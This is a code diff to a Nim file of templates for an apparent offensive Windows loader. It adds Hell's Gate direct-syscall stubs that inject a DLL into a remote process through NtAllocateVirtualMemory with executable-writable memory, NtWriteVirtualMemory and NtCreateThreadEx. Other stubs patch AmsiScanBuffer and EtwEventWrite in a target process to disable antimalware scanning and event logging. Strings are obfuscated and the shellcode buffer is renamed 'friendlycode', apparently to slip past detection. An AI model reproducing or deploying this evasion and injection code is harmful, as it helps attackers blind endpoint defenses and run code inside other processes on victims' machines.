@@ -1,30 +1,17 @@
 import strformat
 import strutils
 
-let HellsgateDInvokeBaseStub * = """
-
-const
-  KERNEL32_DLL* = obf("kernel32.dll")
+let DInvokeGetModuleHandleADelegate* = """
 
 type
-  GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
-  GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
-  OpenProcess_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}
+  GetModuleHandleA_t* = proc(lpModuleName: LPCSTR): HMODULE {.stdcall.}
 
 const
-  GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
-  GetCurrentProcess_HASH * = obf("GetCurrentProcess")
-  OpenProcess_HASH * = obf("OpenProcess")
+  GetModuleHandleA_HASH * = obf("GetModuleHandleA")
 
-var MyGetCurrentProcess*: GetCurrentProcess_t
-var MyGetCurrentProcessId*: GetCurrentProcessId_t
-var MyOpenProcess*: OpenProcess_t
+var MyGetModuleHandleA*: GetModuleHandleA_t
 
-MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))
-
-MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))
-
-MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
+MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))
 
 """
 
@@ -281,70 +268,94 @@ when isMainModule:
 
 let HellsgateRemotePatchAMSIStub* = """
 
-proc remoteLoadLib(var processID: DWORD): void =
+proc remoteLoadAmsi(processID: var DWORD): bool =
 
    
     # C:\windows\system32\amsi.dll
-    var shellcode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
+    var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
      char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
      char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]
 
 
     echo "[*] Target Process: ", processID
 
-    let pHandle = OpenProcess(
-        PROCESS_ALL_ACCESS, 
-        false, 
-        cast[DWORD](processID)
-    )
-    defer: CloseHandle(pHandle)
+    var status: NTSTATUS
+    var success: BOOL
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var pHandle: HANDLE
+    var tHandle: HANDLE
+    var ds: LPVOID
+    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
 
-    echo "[*] pHandle: ", pHandle
+    cid.UniqueProcess = processID
 
-    let rPtr = VirtualAllocEx(
-        pHandle,
-        NULL,
-        cast[SIZE_T](shellcode.len),
-        MEM_COMMIT,
-        PAGE_EXECUTE_READ_WRITE
-    )
-
-    var bytesWritten: SIZE_T
-    let wSuccess = WriteProcessMemory(
-        pHandle, 
-        rPtr,
-        addr shellcode,
-        cast[SIZE_T](shellcode.len),
-        addr bytesWritten
-    )
+    if getSyscall(ntOpenTable):
+        syscall = ntOpenTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtOpenProcess")
     
-    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
- 
-    echo "[*] WriteProcessMemory: ", bool(wSuccess)
-    echo "    \\-- bytes written: ", bytesWritten
-    echo ""
-
-    let tHandle = CreateRemoteThread(
-        pHandle, 
-        NULL,
-        0,
-        pfnThreadRtn,
-        rPtr, 
-        0, 
-        NULL
+    status = NtOpenProcess(
+        &pHandle,
+        PROCESS_ALL_ACCESS, 
+        &oa, &cid         
     )
-    defer: CloseHandle(tHandle)
 
-    echo "[*] tHandle: ", tHandle
-    echo "[+] Injected"
+    echo obf("[*] NtOpenProcess: "), status
 
-    var oldProtect: PDWORD = nil
-    var status = NtProtectVirtualMemory(pHandle, rPtr, cast[SIZE_T](shellcode.len),PAGE_READWRITE,oldProtect)
-    echo $GetLastError()
-    echo status
+    if getSyscall(ntAllocTable):
+        syscall = ntAllocTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
 
-when isMainModule:
-    remoteLoadLib(remoteProcID)
+    status = NtAllocateVirtualMemory(
+        pHandle, &ds, 0, &sc_size, 
+        MEM_COMMIT, 
+        PAGE_EXECUTE_READWRITE)
+    echo obf("[*] NtAllocateVirtualMemory: "), status
+    var bytesWritten: SIZE_T
+
+    if getSyscall(ntWriteTable):
+        syscall = ntWriteTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+    status = NtWriteVirtualMemory(
+        pHandle, 
+        ds, 
+        unsafeAddr friendlycode, 
+        sc_size-1, 
+        addr bytesWritten)
+
+    echo obf("[*] NtWriteVirtualMemory: "), status
+    echo obf("    \\-- bytes written: "), bytesWritten
+    echo obf("")
+
+    if getSyscall(ntCreateTable):
+        syscall = ntCreateTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
+    status = NtCreateThreadEx(
+        &tHandle, 
+        THREAD_ALL_ACCESS, 
+        NULL, 
+        pHandle,
+        pfnThreadRtn, 
+        ds, FALSE, 0, 0, 0, NULL)
+
+    if getSyscall(ntCloseTable):
+        syscall = ntCloseTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtClose")
+
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
+    if(status == 0):
+      return true
+    else:
+      return false
+
 
 proc RemotePatchAmsi(hProcss :HANDLE): bool =
 
@@ -366,34 +377,170 @@ proc RemotePatchAmsi(hProcss :HANDLE): bool =
         echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
         return disabled
 
-    if WriteProcessMemory(hProcss, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
-        echo obf("Failed to write process memory")
-        return disabled
+    var oldProtection: DWORD = 0
+    var success: BOOL
+    var protectAddress = RemoteProc
+
+    var friendlycodeLength = cast[SIZE_T](patch.len)
+    var t: ULONG
+    var op: ULONG
+    var 
+        status          : NTSTATUS          = 0x00000000
+        buffer          : LPVOID
+
+
+    if getSyscall(ntProtectTable):
+                
+        syscall = ntProtectTable.wSysCall
+        status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+                
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to allocate memory.")
+        else:
+            echo obf("[*] Applying Syscall ETW patch")
     else:
-        disabled = true
+        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+    var 
+        bytesWritten: SIZE_T
+
+    if getSyscall(ntWriteTable):
+
+        syscall = ntWriteTable.wSysCall
+        var outLength: SIZE_T
+        status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to write memory.")
+        else:
+            echo obf("[+] NtWriteVirtualMemory Succeed!")
+                
+               
+    else:
+        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+    if getSyscall(ntProtectTable):
+                
+        syscall = ntProtectTable.wSysCall
+        status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+                
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to allocate memory.")
+        else:
+            echo obf("[+] OldProtect set back")
+            disabled = true
+    else:
+        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+
+    #if WriteProcessMemory(hProcss, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
+    #    echo obf("Failed to write process memory")
+    #    return disabled
+    #else:
+    #    disabled = true
     return disabled
 
 when isMainModule:
     var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchAmsi(hProcams)
+    if (success == 0):
+        success = remoteLoadAmsi(remoteProcID)
+        HowMuchTimeWouldYoulikeToSleep(2)
+        success = RemotePatchAmsi(hProcetw)
     echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
 
 """
 
 let HellsgateRemotePatchETWStub* = """
 
-proc remoteLoadLib(var processID: DWORD): void =
+proc remoteLoadNtdll(processID: var DWORD): bool =
 
     # C:\windows\system32\ntdll.dll
-    var shellcode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
+    var friendlycode: array[29, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
     char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
     char(0x33), char(0x32), char(0x5C), char(0x6E), char(0x74), char(0x64), char(0x6C),
     char(0x6C), char(0x2E), char(0x64), char(0x6C), char(0x6C)]
 
 
-
     echo "[*] Target Process: ", processID
 
+    var status: NTSTATUS
+    var success: BOOL
+    var cid: CLIENT_ID
+    var oa: OBJECT_ATTRIBUTES
+    var pHandle: HANDLE
+    var tHandle: HANDLE
+    var ds: LPVOID
+    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
+
+    cid.UniqueProcess = processID
+
+    if getSyscall(ntOpenTable):
+        syscall = ntOpenTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtOpenProcess")
+    
+    status = NtOpenProcess(
+        &pHandle,
+        PROCESS_ALL_ACCESS, 
+        &oa, &cid         
+    )
+
+    echo obf("[*] NtOpenProcess: "), status
+
+    if getSyscall(ntAllocTable):
+        syscall = ntAllocTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+
+    status = NtAllocateVirtualMemory(
+        pHandle, &ds, 0, &sc_size, 
+        MEM_COMMIT, 
+        PAGE_EXECUTE_READWRITE)
+    echo obf("[*] NtAllocateVirtualMemory: "), status
+    var bytesWritten: SIZE_T
+
+    if getSyscall(ntWriteTable):
+        syscall = ntWriteTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+    status = NtWriteVirtualMemory(
+        pHandle, 
+        ds, 
+        unsafeAddr friendlycode, 
+        sc_size-1, 
+        addr bytesWritten)
+
+    echo obf("[*] NtWriteVirtualMemory: "), status
+    echo obf("    \\-- bytes written: "), bytesWritten
+    echo obf("")
+
+    if getSyscall(ntCreateTable):
+        syscall = ntCreateTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
+    status = NtCreateThreadEx(
+        &tHandle, 
+        THREAD_ALL_ACCESS, 
+        NULL, 
+        pHandle,
+        pfnThreadRtn, 
+        ds, FALSE, 0, 0, 0, NULL)
+
+    if getSyscall(ntCloseTable):
+        syscall = ntCloseTable.wSysCall
+    else:
+        echo obf("[-] Failed to find opcode for NtClose")
+
+    status = NtClose(tHandle)
+    status = NtClose(pHandle)
+    if(status == 0):
+      return true
+    else:
+      return false
+#[
     let pHandle = OpenProcess(
         PROCESS_ALL_ACCESS, 
         false, 
@@ -420,7 +567,7 @@ proc remoteLoadLib(var processID: DWORD): void =
         addr bytesWritten
     )
     
-    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandle(r"Kernel32.dll"), r"LoadLibraryA"));
+    var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(r"Kernel32.dll"), r"LoadLibraryA"));
  
     echo "[*] WriteProcessMemory: ", bool(wSuccess)
     echo "    \\-- bytes written: ", bytesWritten
@@ -444,9 +591,7 @@ proc remoteLoadLib(var processID: DWORD): void =
     var status = NtProtectVirtualMemory(pHandle, rPtr, cast[SIZE_T](shellcode.len),PAGE_READWRITE,oldProtect)
     echo $GetLastError()
     echo status
-
-when isMainModule:
-    remoteLoadLib(remoteProcID)
+    ]#
 
 proc RemotePatchEtw(hProcess : HANDLE) : bool =
 
@@ -467,18 +612,78 @@ proc RemotePatchEtw(hProcess : HANDLE) : bool =
         echo obf("[X] Failed to get the address of 'EtwEventWrite'")
         return disabled
 
-    if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
-        echo obf("Failed to write process memory")
-        return disabled
+    var oldProtection: DWORD = 0
+    var success: BOOL
+    var protectAddress = RemoteProc
+
+    var friendlycodeLength = cast[SIZE_T](patch.len)
+    var t: ULONG
+    var op: ULONG
+    var 
+        status          : NTSTATUS          = 0x00000000
+        buffer          : LPVOID
+
+
+    if getSyscall(ntProtectTable):
+                
+        syscall = ntProtectTable.wSysCall
+        status = NtProtectVirtualMemory(hProcess, addr protectAddress,addr friendlycodeLength,0x40,addr t)
+                
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to allocate memory.")
+        else:
+            echo obf("[*] Applying Syscall ETW patch")
     else:
-        disabled = true
+        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+    var 
+        bytesWritten: SIZE_T
+
+    if getSyscall(ntWriteTable):
+
+        syscall = ntWriteTable.wSysCall
+        var outLength: SIZE_T
+        status = NtWriteVirtualMemory(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
+
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to write memory.")
+        else:
+            echo obf("[+] NtWriteVirtualMemory Succeed!")
+                
+               
+    else:
+        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+    if getSyscall(ntProtectTable):
+                
+        syscall = ntProtectTable.wSysCall
+        status = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
+                
+        if not NT_SUCCESS(status):
+            echo obf("[-] Failed to allocate memory.")
+        else:
+            echo obf("[+] OldProtect set back")
+            disabled = true
+    else:
+        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+
+    #if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
+    #    echo obf("Failed to write process memory")
+    #    return disabled
+    #else:
+    #    disabled = true
     return disabled
 
 when isMainModule:
-    var hProcetw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    var hProcetw = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
     success = RemotePatchEtw(hProcetw)
+    if (success == 0):
+        success = remoteLoadNtdll(remoteProcID)
+        HowMuchTimeWouldYoulikeToSleep(2)
+        success = RemotePatchEtw(hProcetw)
     echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
-
+    
 """
 
 let HellsgateAMSIPatchStub*  = """
@@ -709,6 +914,8 @@ let HellsShellcoderemoteinjectStub * = """
         &oa, &cid         
     )
 
+    echo obf("[*] NtOpenProcess: "), status
+
     if getSyscall(ntAllocTable):
         syscall = ntAllocTable.wSysCall
     else:
@@ -718,7 +925,7 @@ let HellsShellcoderemoteinjectStub * = """
         pHandle, &ds, 0, &sc_size, 
         MEM_COMMIT, 
         PAGE_EXECUTE_READWRITE)
-
+    echo obf("[*] NtOpenProcess: "), status
     var bytesWritten: SIZE_T
 
     if getSyscall(ntWriteTable):
@@ -1055,7 +1262,6 @@ when isMainModule:
 
 let HellsgateStub*  = """
 
-import winim/lean as winimport
 
 {.passC:"-masm=intel".}
 
@@ -1066,9 +1272,9 @@ import winim/lean as winimport
 type
     # https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html
     ASSEMBLY_STORAGE_MAP {.pure.} = object
-        Flags*      : winimport.ULONG
-        DosPath*    : winimport.UNICODE_STRING
-        Handle*     : winimport.HANDLE
+        Flags*      : ULONG
+        DosPath*    : UNICODE_STRING
+        Handle*     : HANDLE
     PASSEMBLY_STORAGE_MAP* = ptr ASSEMBLY_STORAGE_MAP
 
     LDR_DLL_LOAD_REASON* {.pure.} = enum
@@ -1092,9 +1298,9 @@ type
         Struct1*  : RTL_BALANCED_NODE_STRUCT1
 
     RTL_BALANCED_NODE_UNION2* {.pure, union.} = object
-        Red*        {.bitsize:1.}   : winimport.UCHAR
-        Balance*    {.bitsize:2.}   : winimport.UCHAR
-        ParentValue*                : winimport.ULONG_PTR
+        Red*        {.bitsize:1.}   : UCHAR
+        Balance*    {.bitsize:2.}   : UCHAR
+        ParentValue*                : ULONG_PTR
 
     RTL_BALANCED_NODE* {.pure.} = object
         Union1* : RTL_BALANCED_NODE_UNION1
@@ -1102,201 +1308,201 @@ type
     PRTL_BALANCED_NODE* = ptr RTL_BALANCED_NODE
 
     LDR_DATA_TABLE_ENTRY_UNION_ONE* {.pure, union.} = object
-        InInitializationOrderLinks*  : winimport.LIST_ENTRY
-        InProgressLinks*             : winimport.LIST_ENTRY
+        InInitializationOrderLinks*  : LIST_ENTRY
+        InProgressLinks*             : LIST_ENTRY
     PLDR_DATA_TABLE_ENTRY_UNION_ONE* = ptr LDR_DATA_TABLE_ENTRY_UNION_ONE
 
     LDR_DATA_TABLE_ENTRY_STRUCT_ONE* {.pure.} = object
-        PackagedBinary* {.bitsize:1.}           : winimport.ULONG
-        MarkedForRemoval* {.bitsize:1.}         : winimport.ULONG
-        ImageDll* {.bitsize:1.}                 : winimport.ULONG
-        LoadNotificationSent* {.bitsize:1.}     : winimport.ULONG
-        TelemetryEntryProcessed* {.bitsize:1.}  : winimport.ULONG
-        ProcessStaticImport* {.bitsize:1.}      : winimport.ULONG
-        InLegacyLists* {.bitsize:1.}            : winimport.ULONG
-        InIndexes* {.bitsize:1.}                : winimport.ULONG
-        ShimDll* {.bitsize:1.}                  : winimport.ULONG
-        InExceptionTable* {.bitsize:1.}         : winimport.ULONG
-        ReservedFlags1* {.bitsize:2.}           : winimport.ULONG
-        LoadInProgress* {.bitsize:1.}           : winimport.ULONG
-        LoadConfigProcessed* {.bitsize:1.}      : winimport.ULONG
-        EntryProcessed* {.bitsize:1.}           : winimport.ULONG
-        ProtectDelayLoad* {.bitsize:1.}         : winimport.ULONG
-        ReservedFlags3* {.bitsize:2.}           : winimport.ULONG
-        DontCallForThreads* {.bitsize:1.}       : winimport.ULONG
-        ProcessAttachCalled* {.bitsize:1.}      : winimport.ULONG
-        ProcessAttachFailed* {.bitsize:1.}      : winimport.ULONG
-        CorDeferredValidate* {.bitsize:1.}      : winimport.ULONG
-        CorImage* {.bitsize:1.}                 : winimport.ULONG
-        DontRelocate {.bitsize:1.}              : winimport.ULONG
-        CorILOnly* {.bitsize:1.}                : winimport.ULONG
-        ChpeImage* {.bitsize:1.}                : winimport.ULONG
-        ReservedFlags5* {.bitsize:2.}           : winimport.ULONG
-        Redirected* {.bitsize:1.}               : winimport.ULONG
-        ReservedFlags6* {.bitsize:2.}           : winimport.ULONG
-        CompatDatabaseProcessed* {.bitsize:1.}  : winimport.ULONG
+        PackagedBinary* {.bitsize:1.}           : ULONG
+        MarkedForRemoval* {.bitsize:1.}         : ULONG
+        ImageDll* {.bitsize:1.}                 : ULONG
+        LoadNotificationSent* {.bitsize:1.}     : ULONG
+        TelemetryEntryProcessed* {.bitsize:1.}  : ULONG
+        ProcessStaticImport* {.bitsize:1.}      : ULONG
+        InLegacyLists* {.bitsize:1.}            : ULONG
+        InIndexes* {.bitsize:1.}                : ULONG
+        ShimDll* {.bitsize:1.}                  : ULONG
+        InExceptionTable* {.bitsize:1.}         : ULONG
+        ReservedFlags1* {.bitsize:2.}           : ULONG
+        LoadInProgress* {.bitsize:1.}           : ULONG
+        LoadConfigProcessed* {.bitsize:1.}      : ULONG
+        EntryProcessed* {.bitsize:1.}           : ULONG
+        ProtectDelayLoad* {.bitsize:1.}         : ULONG
+        ReservedFlags3* {.bitsize:2.}           : ULONG
+        DontCallForThreads* {.bitsize:1.}       : ULONG
+        ProcessAttachCalled* {.bitsize:1.}      : ULONG
+        ProcessAttachFailed* {.bitsize:1.}      : ULONG
+        CorDeferredValidate* {.bitsize:1.}      : ULONG
+        CorImage* {.bitsize:1.}                 : ULONG
+        DontRelocate {.bitsize:1.}              : ULONG
+        CorILOnly* {.bitsize:1.}                : ULONG
+        ChpeImage* {.bitsize:1.}                : ULONG
+        ReservedFlags5* {.bitsize:2.}           : ULONG
+        Redirected* {.bitsize:1.}               : ULONG
+        ReservedFlags6* {.bitsize:2.}           : ULONG
+        CompatDatabaseProcessed* {.bitsize:1.}  : ULONG
 
     LDR_DATA_TABLE_ENTRY_UNION_TWO* {.pure, union.} = object
-        FlagGroup*   : array[4, winimport.UCHAR]
-        Flags*       : winimport.ULONG
+        FlagGroup*   : array[4, UCHAR]
+        Flags*       : ULONG
         Struct*      : LDR_DATA_TABLE_ENTRY_STRUCT_ONE            
     PLDR_DATA_TABLE_ENTRY_UNION_TWO* = ptr LDR_DATA_TABLE_ENTRY_UNION_TWO
     
     LDR_DATA_TABLE_ENTRY* {.pure.} = object
-        InLoadOrderLinks*               : winimport.LIST_ENTRY
-        InMemoryOrderLinks*             : winimport.LIST_ENTRY
+        InLoadOrderLinks*               : LIST_ENTRY
+        InMemoryOrderLinks*             : LIST_ENTRY
         Union_1*                        : LDR_DATA_TABLE_ENTRY_UNION_ONE
-        DLLBase*                        : winimport.PVOID
-        EntryPoint*                     : winimport.PVOID
-        SizeOfImage*                    : winimport.ULONG
-        FullDllName*                    : winimport.UNICODE_STRING
-        BaseDllName*                    : winimport.UNICODE_STRING
+        DLLBase*                        : PVOID
+        EntryPoint*                     : PVOID
+        SizeOfImage*                    : ULONG
+        FullDllName*                    : UNICODE_STRING
+        BaseDllName*                    : UNICODE_STRING
         Union_2*                        : LDR_DATA_TABLE_ENTRY_UNION_TWO
-        ObsoleteLoadCount               : winimport.USHORT
-        TlsIndex*                       : winimport.USHORT
-        HashLinks*                      : winimport.LIST_ENTRY
-        TimeDateStamp*                  : winimport.ULONG
-        EntryPointActivationContext*    : winimport.PVOID
-        Lock*                           : winimport.PVOID
-        DdgagNode*                      : winimport.PVOID       # PLDR_DDAG_NODE
-        NodeModuleLink*                 : winimport.LIST_ENTRY
-        LoadContext*                    : winimport.PVOID       # PLDRP_LOAD_CONTEXT
-        ParentDllBase                   : winimport.PVOID
-        SwitchBackContext*              : winimport.PVOID
+        ObsoleteLoadCount               : USHORT
+        TlsIndex*                       : USHORT
+        HashLinks*                      : LIST_ENTRY
+        TimeDateStamp*                  : ULONG
+        EntryPointActivationContext*    : PVOID
+        Lock*                           : PVOID
+        DdgagNode*                      : PVOID       # PLDR_DDAG_NODE
+        NodeModuleLink*                 : LIST_ENTRY
+        LoadContext*                    : PVOID       # PLDRP_LOAD_CONTEXT
+        ParentDllBase                   : PVOID
+        SwitchBackContext*              : PVOID
         BaseAddressIndexNode*           : RTL_BALANCED_NODE
         MappingInfoIndexNode*           : RTL_BALANCED_NODE
-        OriginalBase*                   : winimport.ULONG_PTR
-        LoadTime*                       : winimport.LARGE_INTEGER
-        BaseNameHashValue*              : winimport.ULONG
+        OriginalBase*                   : ULONG_PTR
+        LoadTime*                       : LARGE_INTEGER
+        BaseNameHashValue*              : ULONG
         LoadReason*                     : LDR_DLL_LOAD_REASON
-        ImplicitPathOptions*            : winimport.ULONG
-        ReferenceCount*                 : winimport.ULONG
-        DependentLoadFlags*             : winimport.ULONG
-        SigningLevel*                   : winimport.UCHAR
+        ImplicitPathOptions*            : ULONG
+        ReferenceCount*                 : ULONG
+        DependentLoadFlags*             : ULONG
+        SigningLevel*                   : UCHAR
     PLDR_DATA_TABLE_ENTRY* = ptr LDR_DATA_TABLE_ENTRY
 
     PEB_LDR_DATA* {.pure.} = object
-        Length*                             : winimport.ULONG
-        Initialized*                        : winimport.BOOLEAN
-        SsHandle*                           : winimport.PVOID
-        InLoadOrderModuleList*              : winimport.LIST_ENTRY
-        InMemoryOrderModuleList*            : winimport.LIST_ENTRY
-        InInitializationOrderModuleList*    : winimport.LIST_ENTRY
-        EntryInProgress*                    : winimport.PVOID
-        ShutdownInProgress*                 : winimport.BOOLEAN
-        ShutdownThreadId*                   : winimport.HANDLE
+        Length*                             : ULONG
+        Initialized*                        : BOOLEAN
+        SsHandle*                           : PVOID
+        InLoadOrderModuleList*              : LIST_ENTRY
+        InMemoryOrderModuleList*            : LIST_ENTRY
+        InInitializationOrderModuleList*    : LIST_ENTRY
+        EntryInProgress*                    : PVOID
+        ShutdownInProgress*                 : BOOLEAN
+        ShutdownThreadId*                   : HANDLE
     PPEB_LDR_DATA* = ptr PEB_LDR_DATA
 
     PEB* {.pure.} = object
-        InheritedAddressSpace*                  : winimport.BOOLEAN
-        ReadImageFileExecOptions*               : winimport.BOOLEAN
-        BeingDebugged*                          : winimport.BOOLEAN
-        PebUnion1*                              : winimport.UCHAR
-        Padding0*                               : array[4, winimport.UCHAR]
-        Mutant*                                 : winimport.HANDLE
-        ImageBaseAddress*                       : winimport.PVOID
+        InheritedAddressSpace*                  : BOOLEAN
+        ReadImageFileExecOptions*               : BOOLEAN
+        BeingDebugged*                          : BOOLEAN
+        PebUnion1*                              : UCHAR
+        Padding0*                               : array[4, UCHAR]
+        Mutant*                                 : HANDLE
+        ImageBaseAddress*                       : PVOID
         Ldr*                                    : PPEB_LDR_DATA                             
-        ProcessParameters*                      : winimport.PRTL_USER_PROCESS_PARAMETERS  
-        SubSystemData*                          : winimport.PVOID                         
-        ProcessHeap*                            : winimport.HANDLE                        
-        FastPebLock*                            : winimport.PVOID          # PRTL_CRITICAL_SECTION
-        AtlThunkSListPtr*                       : winimport.PVOID                         
-        IFEOKey*                                : winimport.PVOID                         
-        PebUnion2*                              : winimport.ULONG                         
-        Padding1*                               : array[4, winimport.UCHAR]               
-        KernelCallBackTable*                    : ptr winimport.PVOID                     
-        SystemReserved*                         : winimport.ULONG                         
-        AltThunkSListPtr32*                     : winimport.ULONG                         
-        ApiSetMap*                              : winimport.PVOID                         
-        TlsExpansionCounter*                    : winimport.ULONG                         
-        Padding2*                               : array[4, winimport.UCHAR]               
-        TlsBitmap*                              : winimport.PVOID                         
-        TlsBitmapBits*                          : array[2, winimport.ULONG]               
-        ReadOnlyShareMemoryBase*                : winimport.PVOID                         
-        SharedData*                             : winimport.PVOID                         
-        ReadOnlyStaticServerData*               : ptr winimport.PVOID                     
-        AnsiCodePageData*                       : winimport.PVOID                         
-        OemCodePageData*                        : winimport.PVOID                         
-        UnicodeCaseTableData*                   : winimport.PVOID                         
-        NumberOfProcessors*                     : winimport.ULONG                         
-        NtGlobalFlag*                           : winimport.ULONG                         
-        CriticalSectionTimeout*                 : winimport.LARGE_INTEGER                 
-        HeapSegmentReserve*                     : winimport.ULONG_PTR                     
-        HeapSegmentCommit*                      : winimport.ULONG_PTR                     
-        HeapDeCommitTotalFreeThreshold*         : winimport.ULONG_PTR                     
-        HeapDeCommitFreeBlockThreshold*         : winimport.ULONG_PTR                     
-        NumberOfHeaps*                          : winimport.ULONG                         
-        MaximumNumberOfHeaps*                   : winimport.ULONG                         
-        ProcessHeaps*                           : ptr winimport.PVOID                     
-        GdiSharedHandleTable*                   : winimport.PVOID                         
-        ProcessStarterHelper*                   : winimport.PVOID                         
-        GdiDCAttributeList*                     : winimport.ULONG                         
-        Padding3*                               : array[4, winimport.UCHAR]               
-        LoaderLock*                             : winimport.PVOID           # PRTL_CRITICAL_SECTION
-        OSMajorVersion*                         : winimport.ULONG
-        OSMinorVersion*                         : winimport.ULONG
-        OSBuildNumber*                          : winimport.USHORT
-        OSCSDVersion*                           : winimport.USHORT
-        OSPlatformId*                           : winimport.ULONG
-        ImageSubsystem*                         : winimport.ULONG
-        ImageSubsystemMajorVersion*             : winimport.ULONG
-        ImageSubsystemMinorVersion*             : winimport.ULONG
-        Padding4                                : array[4, winimport.UCHAR]
-        ActiveProcessAffinityMask*              : winimport.PVOID            # KAFFINITY
-        GdiHandleBuffer                         : array[0x3c, winimport.ULONG]
-        PostProcessInitRoutine*                 : winimport.VOID
-        TlsExpansionBitmap*                     : winimport.PVOID
-        TlsExpansionBitmapBits*                 : array[0x20, winimport.ULONG]
-        SessionId*                              : winimport.ULONG
-        Padding5*                               : array[4, winimport.UCHAR]
-        AppCompatFlags*                         : winimport.ULARGE_INTEGER
-        AppCompatFlagsUser*                     : winimport.ULARGE_INTEGER
-        ShimData*                               : winimport.PVOID
-        AppCompatInfo*                          : winimport.PVOID
-        CSDVersion*                             : winimport.UNICODE_STRING
-        ActivationContextData*                  : winimport.PVOID             # PACTIVATION_CONTEXT_DATA 
-        ProcessAssemblyStorageMap*              : winimport.PVOID             # PASSEMBLY_STORAGE_MAP
-        SystemDefaultActivationContextData*     : winimport.PVOID             # PACTIVATION_CONTEXT_DATA
-        SystemAssemblyStorageMap*               : winimport.PVOID             # PASSEMBLY_STORAGE_MAP
-        MinimumStackCommit*                     : winimport.ULONG_PTR
